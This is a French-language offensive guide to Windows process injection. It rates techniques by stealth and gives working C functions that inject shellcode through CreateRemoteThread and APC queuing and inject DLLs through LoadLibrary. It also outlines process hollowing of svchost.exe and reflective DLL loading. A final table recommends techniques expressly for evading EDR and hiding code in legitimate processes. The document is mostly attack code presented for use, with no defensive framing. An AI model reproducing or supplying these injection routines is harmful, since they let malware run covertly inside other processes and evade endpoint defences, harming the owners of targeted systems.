# Guide Injection de Process

## Techniques d'injection

| Technique | Discrétion | Complexité |
|-----------|------------|------------|
| CreateRemoteThread | ⭐⭐ | Facile |
| Process Hollowing | ⭐⭐⭐⭐ | Difficile |
| APC Injection | ⭐⭐⭐⭐ | Moyen |
| DLL Injection | ⭐⭐ | Facile |
| Reflective DLL | ⭐⭐⭐⭐⭐ | Très difficile |

---

## 1. CreateRemoteThread (classique)

```c
BOOL InjectShellcode(DWORD pid, BYTE* shellcode, SIZE_T size) {
    // 1. Ouvrir le process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    
    // 2. Allouer mémoire RWX
    LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // 3. Écrire le shellcode
    WriteProcessMemory(hProcess, remoteBuffer, shellcode, size, NULL);
    
    // 4. Créer thread
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return TRUE;
}
```

---

## 2. Process Hollowing

```
1. CreateProcess("svchost.exe", CREATE_SUSPENDED)
2. NtUnmapViewOfSection(imageBase)
3. VirtualAllocEx(at imageBase)
4. WriteProcessMemory(PE headers + sections)
5. SetThreadContext(new entry point)
6. ResumeThread()
```

Résultat: svchost.exe exécute ton code.

---

## 3. APC Injection

```c
BOOL APCInject(DWORD pid, BYTE* shellcode, SIZE_T size) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    
    // Allouer et écrire
    LPVOID remote = VirtualAllocEx(hProcess, NULL, size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, remote, shellcode, size, NULL);
    
    // Queue APC sur tous les threads
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = {sizeof(te)};
    
    if (Thread32First(hSnap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                QueueUserAPC((PAPCFUNC)remote, hThread, 0);
                CloseHandle(hThread);
            }
        } while (Thread32Next(hSnap, &te));
    }
    CloseHandle(hSnap);
    return TRUE;
}
```

---

## 4. DLL Injection

```c
BOOL DLLInject(DWORD pid, const char* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    
    // Écrire le chemin de la DLL
    size_t len = strlen(dllPath) + 1;
    LPVOID remotePath = VirtualAllocEx(hProcess, NULL, len,
        MEM_COMMIT, PAGE_READWRITE);
    WriteProcessMemory(hProcess, remotePath, dllPath, len, NULL);
    
    // Appeler LoadLibrary
    LPVOID loadLib = GetProcAddress(GetModuleHandle("kernel32"), "LoadLibraryA");
    CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)loadLib, remotePath, 0, NULL);
    
    return TRUE;
}
```

---

## 5. Reflective DLL

La DLL se charge elle-même en mémoire:
- Pas besoin de LoadLibrary
- Pas de fichier sur disque
- Parse ses propres headers PE
- Résout ses imports
- Appelle DllMain

---

## Choisir sa technique

| Situation | Technique recommandée |
|-----------|----------------------|
| Test rapide | CreateRemoteThread |
| Évasion EDR | APC ou Reflective |
| Process légitime | Process Hollowing |
| Charger fonctionnalités | DLL Injection |
